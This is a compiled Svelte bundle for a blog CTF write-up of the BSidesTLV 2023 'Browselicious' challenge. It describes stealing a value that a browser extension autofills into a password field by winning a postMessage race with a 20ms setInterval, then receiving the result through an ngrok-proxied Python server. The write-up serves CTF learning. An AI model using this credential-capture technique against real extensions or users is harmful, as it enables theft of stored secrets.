#89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">wfile</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">write</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">html_content</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">utf-8</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">))</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">with</span><span style="color: #EEFFFF"> socketserver</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">TCPServer</span><span style="color: #89DDFF">((</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">0.0.0.0</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> PORT</span><span style="color: #89DDFF">),</span><span style="color: #82AAFF"> MyHandler</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> httpd</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Serving at port </span><span style="color: #82AAFF">&#123;PORT&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    httpd</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">serve_forever</span><span style="color: #89DDFF">()</span></div></code></div></pre>`,Ns;return{c(){d=t("h1"),E=t("a"),A=e("Introducton"),g=c(),y=t("p"),h=e("This writeup is for the "),b=t("strong"),gl=e("Browselicious"),bl=e(" challenge from "),ys=t("strong"),Tl=e("Misc"),kl=e(" category in BSidesTLV CTF held online. The challenge had an external link and a "),Ds=t("code"),Pl=e("js"),xl=e(" file that contained browser extension code. The external link was a simple website that had a URL Input field. The URL was probably being processed in a browser on the backend with the extension installed."),zs=c(),m=t("p"),Rl=e("To complete the challenge, one had to create a document with a "),ds=t("code"),Ol=e('input[type="password"]'),Bl=e(" field and capture the value of this field when populated by the extension itself. But also, we needed to exploit a race condition here by doing a "),vs=t("code"),Ml=e("postMessage"),Ll=e(" before the extension itself."),Xs=c(),I=t("h1"),N=t("a"),Hl=e("Writeup"),Js=c(),S=t("h3"),z=t("a"),Il=e("Server Request"),Ks=c(),w=t("p"),Sl=e("Right after i visited the page, it said "),Es=t("em"),ql=e("Our Extension is coming soon"),jl=e(" and there was an input field that accepted a URL. So, right away i fired up "),fs=t("code"),$l=e("ngrok"),Wl=e(" without actually running anything for the proxy and checked if i received anything back."),Qs=c(),us=new L(!1),hs=c(),X=t("p"),Gl=e("And i got requests back on terminal."),sl=c(),T=t("img"),ll=c(),q=t("h3"),J=t("a"),Ul=e("Code Review"),al=c(),v=t("p"),Vl=e("Then i opened the "),Cs=t("code"),Zl=e("js"),Yl=e(" file and the code has 2 main events: "),ms=t("code"),Nl=e("onMessage"),zl=e(" and "),ws=t("code"),Xl=e("onLoad"),Jl=e(". The first event checks for a couple conditions and populates data in the "),_s=t("code"),Kl=e('input[type="password"]'),Ql=e(" field. The second event simply fires a "),As=t("code"),sa=e("postMessage"),la=e(" to the current window with some data."),ol=c(),gs=new L(!1),bs=c(),j=t("h3"),K=t("a"),aa=e("Exploit"),el=c(),Q=t("p"),oa=e("To exploit the challenge, we need to implement 3 things in the PoC:"),nl=c(),_=t("ul"),$=t("li"),ea=e("Create a web page with "),Ts=t("code"),na=e('input[type="password"]'),pa=e(" form field which will accept the data."),ta=c(),W=t("li"),Fa=e("Exploit the Race condition by setting an interval in "),ks=t("em"),ra=e("milliseconds"),ca=e("."),ia=c(),C=t("li"),ya=e("In the "),Ps=t("code"),Da=e("postMessage"),da=e(", set the value of "),xs=t("code"),va=e("url"),Ea=e(" to "),Rs=t("code"),fa=e("http://flag"),ua=e("."),pl=c(),k=t("p"),ha=e("Before we head to the exploit work, setup a "),Os=t("code"),Ca=e("python"),ma=e(" file to act as our server:"),tl=c(),Bs=new L(!1),Ms=c(),G=t("h4"),ss=t("a"),wa=e("Input Field"),Fl=c(),ls=t("p"),_a=e("Put together an html code that as input field:"),rl=c(),Ls=new L(!1),Hs=c(),as=t("p"),Aa=e("I fired up this python server, proxied through ngrok:"),cl=c(),Is=new L(!1),Ss=c(),os=t("p"),ga=e("Got, the following result:"),il=c(),P=t("img"),yl=c(),U=t("h4"),es=t("a"),ba=e("Race Condition"),Dl=c(),f=t("p"),Ta=e("To exploit the race condition, i simply replaced the "),qs=t("code"),ka=e("addEventListener"),Pa=e(" with "),js=t("code"),xa=e("setInterval"),Ra=e(" having "),$s=t("code"),Oa=e("20ms"),Ba=e("."),dl=c(),Ws=new L(!1),Gs=c(),V=t("h4"),ns=t("a"),Ma=e("Post Message"),vl=c(),x=t("p"),La=e("Now, simply put the "),Us=t("code"),Ha=e("postMessage"),Ia=e(" inside the callback function:"),El=c(),Vs=new L(!1),Zs=c(),ps=t("p"),Sa=e("This time i fired up the server and got the flag:"),fl=c(),R=t("img"),ul=c(),Z=t("h2"),ts=t("a"),qa=e("PoC"),hl=c(),Fs=t("p"),ja=e("The complete Proof of Concept:"),Cl=c(),Ys=new L(!1),Ns=$o(),this.h()},l(s){d=F(s,"H1",{id:!0});var o=r(d);E=F(o,"A",{href:!0});var Za=r(E);A=n(Za,"Introducton"),Za.forEach(l),o.forEach(l),g=i(s),y=F(s,"P",{});var O=r(y);h=n(O,"This writeup is for the "),b=F(O,"STRONG",{});var Ya=r(b);gl=n(Ya,"Browselicious"),Ya.forEach(l),bl=n(O," challenge from "),ys=F(O,"STRONG",{});var Na=r(ys);Tl=n(Na,"Misc"),Na.forEach(l),kl=n(O," category in BSidesTLV CTF held online. The challenge had an external link and a "),Ds=F(O,"CODE",{});var za=r(Ds);Pl=n(za,"js"),za.forEach(l),xl=n(O," file that contained browser extension code. The external link was a simple website that had a URL Input field. The URL was probably being processed in a browser on the backend with the extension installed."),O.forEach(l),zs=i(s),m=F(s,"P",{});var rs=r(m);Rl=n(rs,"To complete the challenge, one had to create a document with a "),ds=F(rs,"CODE",{});var Xa=r(ds);Ol=n(Xa,'input[type="password"]'),Xa.forEach(l),Bl=n(rs," field and capture the value of this field when populated by the extension itself. But also, we needed to exploit a race condition here by doing a "),vs=F(rs,"CODE",{});var Ja=r(vs);Ml=n(Ja,"postMessage"),Ja.forEach(l),Ll=n(rs," before the extension itself."),rs.forEach(l),Xs=i(s),I=F(s,"H1",{id:!0});var Ka=r(I);N=F(Ka,"A",{href:!0});var Qa=r(N);Hl=n(Qa,"Writeup"),Qa.forEach(l),Ka.forEach(l),Js=i(s),S=F(s,"H3",{id:!0});var so=r(S);z=F(so,"A",{href:!0});var lo=r(z);Il=n(lo,"Server Request"),lo.forEach(l),so.forEach(l),Ks=i(s),w=F(s,"P",{});var cs=r(w);Sl=n(cs,"Right after i visited the page, it said "),Es=F(cs,"EM",{});var ao=r(Es);ql=n(ao,"Our Extension is coming soon"),ao.forEach(l),jl=n(cs," and there was an input field that accepted a URL. So, right away i fired up "),fs=F(cs,"CODE",{});var oo=r(fs);$l=n(oo,"ngrok"),oo.forEach(l),Wl=n(cs," without actually running anything for the proxy and checked if i received anything back."),cs.forEach(l),Qs=i(s),us=H(s,!1),hs=i(s),X=F(s,"P",{});var eo=r(X);Gl=n(eo,"And i got requests back on terminal."),eo.forEach(l),sl=i(s),T=F(s,"IMG",{width:!0,alt:!0,src:!0}),ll=i(s),q=F(s,"H3",{id:!0});var no=r(q);J=F(no,"A",{href:!0});var po=r(J);Ul=n(po,"Code Review"),po.forEach(l),no.forEach(l),al=i(s),v=F(s,"P",{});var u=r(v);Vl=n(u,"Then i opened the "),Cs=F(u,"CODE",{});var to=r(Cs);Zl=n(to,"js"),to.forEach(l),Yl=n(u," file and the code has 2 main events: "),ms=F(u,"CODE",{});var Fo=r(ms);Nl=n(Fo,"onMessage"),Fo.forEach(l),zl=n(u," and "),ws=F(u,"CODE",{});var ro=r(ws);Xl=n(ro,"onLoad"),ro.forEach(l),Jl=n(u,". The first event checks for a couple conditions and populates data in the "),_s=F(u,"CODE",{});var co=r(_s);Kl=n(co,'input[type="password"]'),co.forEach(l),Ql=n(u," field. The second event simply fires a "),As=F(u,"CODE",{});var io=r(As);sa=n(io,"postMessage"),io.forEach(l),la=n(u," to the current window with some data."),u.forEach(l),ol=i(s),gs=H(s,!1),bs=i(s),j=F(s,"H3",{id:!0});var yo=r(j);K=F(yo,"A",{href:!0});var Do=r(K);aa=n(Do,"Exploit"),Do.forEach(l),yo.forEach(l),el=i(s),Q=F(s,"P",{});var vo=r(Q);oa=n(vo,"To exploit the challenge, we need to implement 3 things in the PoC:"),vo.forEach(l),nl=i(s),_=F(s,"UL",{});var is=r(_);$=F(is,"LI",{});var ml=r($);ea=n(ml,"Create a web page with "),Ts=F(ml,"CODE",{});var Eo=r(Ts);na=n(Eo,'input[type="password"]'),Eo.forEach(l),pa=n(ml," form field which will accept the data."),ml.forEach(l),ta=i(is),W=F(is,"LI",{});var wl=r(W);Fa=n(wl,"Exploit the Race condition by setting an interval in "),ks=F(wl,"EM",{});var fo=r(ks);ra=n(fo,"milliseconds"),fo.forEach(l),ca=n(wl,"."),wl.forEach(l),ia=i(is),C=F(is,"LI",{});var B=r(C);ya=n(B,"In the "),Ps=F(B,"CODE",{});var uo=r(Ps);Da=n(uo,"postMessage"),uo.forEach(l),da=n(B,", set the value of "),xs=F(B,"CODE",{});var ho=r(xs);va=n(ho,"url"),ho.forEach(l),Ea=n(B," to "),Rs=F(B,"CODE",{});var Co=r(Rs);fa=n(Co,"http://flag"),Co.forEach(l),ua=n(B,"."),B.forEach(l),is.forEach(l),pl=i(s),k=F(s,"P",{});var _l=r(k);ha=n(_l,"Before we head to the exploit work, setup a "),Os=F(_l,"CODE",{});var mo=r(Os);Ca=n(mo,"python"),mo.forEach(l),ma=n(_l," file to act as our server:"),_l.forEach(l),tl=i(s),Bs=H(s,!1),Ms=i(s),G=F(s,"H4",{id:!0});var wo=r(G);ss=F(wo,"A",{href:!0});var _o=r(ss);wa=n(_o,"Input Field"),_o.forEach(l),wo.forEach(l),Fl=i(s),ls=F(s,"P",{});var Ao=r(ls);_a=n(Ao,"Put together an html code that as input field:"),Ao.forEach(l),rl=i(s),Ls=H(s,!1),Hs=i(s),as=F(s,"P",{});var go=r(as);Aa=n(go,"I fired up this python server, proxied through ngrok:"),go.forEach(l),cl=i(s),Is=H(s,!1),Ss=i(s),os=F(s,"P",{});var bo=r(os);ga=n(bo,"Got, the following result:"),bo.forEach(l),il=i(s),P=F(s,"IMG",{width:!0,alt:!0,src:!0}),yl=i(s),U=F(s,"H4",{id:!0});var To=r(U);es=F(To,"A",{href:!0});var ko=r(es);ba=n(ko,"Race Condition"),ko.forEach(l),To.forEach(l),Dl=i(s),f=F(s,"P",{});var M=r(f);Ta=n(M,"To exploit the race condition, i simply replaced the "),qs=F(M,"CODE",{});var Po=r(qs);ka=n(Po,"addEventListener"),Po.forEach(l),Pa=n(M," with "),js=F(M,"CODE",{});var xo=r(js);xa=n(xo,"setInterval"),xo.forEach(l),Ra=n(M," having "),$s=F(M,"CODE",{});var Ro=r($s);Oa=n(Ro,"20ms"),Ro.forEach(l),Ba=n(M,"."),M.forEach(l),dl=i(s),Ws=H(s,!1),Gs=i(s),V=F(s,"H4",{id:!0});var Oo=r(V);ns=F(Oo,"A",{href:!0});var Bo=r(ns);Ma=n(Bo,"Post Message"),Bo.forEach(l),Oo.forEach(l),vl=i(s),x=F(s,"P",{});var Al=r(x);La=n(Al,"Now, simply put the "),Us=F(Al,"CODE",{});var Mo=r(Us);Ha=n(Mo,"postMessage"),Mo.forEach(l),Ia=n(Al," inside the callback function:"),Al.forEach(l),El=i(s),Vs=H(s,!1),Zs=i(s),ps=F(s,"P",{});var Lo=r(ps);Sa=n(Lo,"This time i fired up the server and got the flag:"),Lo.forEach(l),fl=i(s),R=F(s,"IMG",{width:!0,alt:!0,src:!0}),ul=i(s),Z=F(s,"H2",{id:!0});var Ho=r(Z);ts=F(Ho,"A",{href:!0});var Io=r(ts);qa=n(Io,"PoC"),Io.forEach(l),Ho.forEach(l),hl=i(s),Fs=F(s,"P",{});var So=r(Fs);ja=n(So,"The complete Proof of Concept:"),So.forEach(l),Cl=i(s),Ys=H(s,!1),Ns=$o(),this.h()},h(){D(E,"href","#introducton"),D(d,"id","introducton"),D(N,"href","#writeup"),D(I,"id","writeup"),D(z,"href","#server-request"),D(S,"id","server-request"),us.a=hs,D(T,"width","946"),D(T,"alt","image"),$a(T.src,Ga="https://github.com/hash3liZer/khatta/assets/29171692/ba40787f-c811-46ec-93a5-1a67298d9a28")||D(T,"src",Ga),D(J,"href","#code-review"),D(q,"id","code-review"),gs.a=bs,D(K,"href","#exploit"),D(j,"id","exploit"),Bs.a=Ms,D(ss,"href","#input-field"),D(G,"id","input-field"),Ls.a=Hs,Is.a=Ss,D(P,"width","946"),D(P,"alt","image"),$a(P.src,Ua="https://github.com/hash3liZer/khatta/assets/29171692/d267f5fa-f46e-4443-b43e-64f354a443dc")||D(P,"src",Ua),D(es,"href","#race-condition"),D(U,"id","race-condition"),Ws.a=Gs,D(ns,"href","#post-message"),D(V,"id","post-message"),Vs.a=Zs,D(R,"width","946"),D(R,"alt","image"),$a(R.src,Va="https://github.com/hash3liZer/khatta/assets/29171692/aaa3fa1b-1c7b-45d4-9745-4464d6dd1f4f")||D(R,"src",Va),D(ts,"href","#poc"),D(Z,"id","poc"),Ys.a=Ns},m(s,o){p(s,d,o),a(d,E),a(E,A),p(s,g,o),p(s,y,o),a(y,h),a(y,b),a(b,gl),a(y,bl),a(y,ys),a(ys,Tl),a(y,kl),a(y,Ds),a(Ds,Pl),a(y,xl),p(s,zs,o),p(s,m,o),a(m,Rl),a(m,ds),a(ds,Ol),a(m,Bl),a(m,vs),a(vs,Ml),a(m,Ll),p(s,Xs,o),p(s,I,o),a(I,N),a(N,Hl),p(s,Js,o),p(s,S,o),a(S,z),a(z,Il),p(s,Ks,o),p(s,w,o),a(w,Sl),a(w,Es),a(Es,ql),a(w,jl),a(w,fs),a(fs,$l),a(w,Wl),p(s,Qs,o),us.m(Go,s,o),p(s,hs,o),p(s,X,o),a(X,Gl),p(s,sl,o),p(s,T,o),p(s,ll,o),p(s,q,o),a(q,J),a(J,Ul),p(s,al,o),p(s,v,o),a(v,Vl),a(v,Cs),a(Cs,Zl),a(v,Yl),a(v,ms),a(ms,Nl),a(v,zl),a(v,ws),a(ws,Xl),a(v,Jl),a(v,_s),a(_s,Kl),a(v,Ql),a(v,As),a(As,sa),a(v,la),p(s,ol,o),gs.m(Uo,s,o),p(s,bs,o),p(s,j,o),a(j,K),a(K,aa),p(s,el,o),p(s,Q,o),a(Q,oa),p(s,nl,o),p(s,_,o),a(_,$),a($,ea),a($,Ts),a(Ts,na),a($,pa),a(_,ta),a(_,W),a(W,Fa),a(W,ks),a(ks,ra),a(W,ca),a(_,ia),a(_,C),a(C,ya),a(C,Ps),a(Ps,Da),a(C,da),a(C,xs),a(xs,va),a(C,Ea),a(C,Rs),a(Rs,fa),a(C,ua),p(s,pl,o),p(s,k,o),a(k,ha),a(k,Os),a(Os,Ca),a(k,ma),p(s,tl,o),Bs.m(Vo,s,o),p(s,Ms,o),p(s,G,o),a(G,ss),a(ss,wa),p(s,Fl,o),p(s,ls,o),a(ls,_a),p(s,rl,o),Ls.m(Zo,s,o),p(s,Hs,o),p(s,as,o),a(as,Aa),p(s,cl,o),Is.m(Yo,s,o),p(s,Ss,o),p(s,os,o),a(os,ga),p(s,il,o),p(s,P,o),p(s,yl,o),p(s,U,o),a(U,es),a(es,ba),p(s,Dl,o),p(s,f,o),a(f,Ta),a(f,qs),a(qs,ka),a(f,Pa),a(f,js),a(js,xa),a(f,Ra),a(f,$s),a($s,Oa),a(f,Ba),p(s,dl,o),Ws.m(No,s,o),p(s,Gs,o),p(s,V,o),a(V,ns),a(ns,Ma),p(s,vl,o),p(s,x,o),a(x,La),a(x,Us),a(Us,Ha),a(x,Ia),p(s,El,o),Vs.m(zo,s,o),p(s,Zs,o),p(s,ps,o),a(ps,Sa),p(s,fl,o),p(s,R,o),p(s,ul,o),p(s,Z,o),a(Z,ts),a(ts,qa),p(s,hl,o),p(s,Fs,o),a(Fs,ja),p(s,Cl,o),Ys.m(Xo,s,o),p(s,Ns,o)},p:te,d(s){s&&l(d),s&&l(g),s&&l(y),s&&l(zs),s&&l(m),s&&l(Xs),s&&l(I),s&&l(Js),s&&l(S),s&&l(Ks),s&&l(w),s&&l(Qs),s&&us.d(),s&&l(hs),s&&l(X),s&&l(sl),s&&l(T),s&&l(ll),s&&l(q),s&&l(al),s&&l(v),s&&l(ol),s&&gs.d(),s&&l(bs),s&&l(j),s&&l(el),s&&l(Q),s&&l(nl),s&&l(_),s&&l(pl),s&&l(k),s&&l(tl),s&&Bs.d(),s&&l(Ms),s&&l(G),s&&l(Fl),s&&l(ls),s&&l(rl),s&&Ls.d(),s&&l(Hs),s&&l(as),s&&l(cl),s&&Is.d(),s&&l(Ss),s&&l(os),s&&l(il),s&&l(P),s&&l(yl),s&&l(U),s&&l(Dl),s&&l(f),s&&l(dl),s&&Ws.d(),s&&l(Gs),s&&l(V),s&&l(vl),s&&l(x),s&&l(El),s&&Vs.d(),s&&l(Zs),s&&l(ps),s&&l(fl),s&&l(R),s&&l(ul),s&&l(Z),s&&l(hl),s&&l(Fs),s&&l(Cl),s&&l(Ns),s&&Ys.d()}}}function ce(Y){let d,E;const A=[Y[0],Wo];let g={$$slots:{default:[re]},$$scope:{ctx:Y}};for(let y=0;y<A.length;y+=1)g=Wa(g,A[y]);return d=new Fe({props:g}),{c(){se(d.$$.fragment)},l(y){le(d.$$.fragment,y)},m(y,h){ae(d,y,h),E=!0},p(y,[h]){const b=h&1?oe(A,[h&1&&qo(y[0]),h&0&&qo(Wo)]):{};h&2&&(b.$$scope={dirty:h,ctx:y}),d.$set(b)},i(y){E||(ee(d.$$.fragment,y),E=!0)},o(y){ne(d.$$.fragment,y),E=!1},d(y){pe(d,y)}}}const Wo={title:"BSidesTLV CTF 2023 Browselicious (Misc) Writeup",tags:["ctf","writeups","bsidestlv-ctf-2023"],categories:["CTF Writeups"],summary:"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023",created:"2023-06-28T00:00:00.000Z",lastmod:"2023-06-28T00:00:00.000Z",image:"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d",flags:[],updated:"2023-06-28T19:26:46.804Z",slug:"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf/+page.md",path:"/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf",toc:[{depth:1,title:"Introducton",slug:"introducton"},{depth:1,title:"Writeup",slug:"writeup"},{depth:3,title:"Server Request",slug:"server-request"},{depth:3,title:"Code Review",slug:"code-review"},{depth:3,title:"Exploit",slug:"exploit"},{depth:4,title:"Input Field",slug:"input-field"},{depth:4,title:"Race Condition",slug:"race-condition"},{depth:4,title:"Post Message",slug:"post-message"},{depth:2,title:"PoC",slug:"poc"}]};function ie(Y,d,E){return Y.$$set=A=>{E(0,d=Wa(Wa({},d),jo(A)))},d=jo(d),[d]}class de extends Jo{constructor(d){super(),Ko(this,d,ie,ce,Qo,{})}}export{de as component};
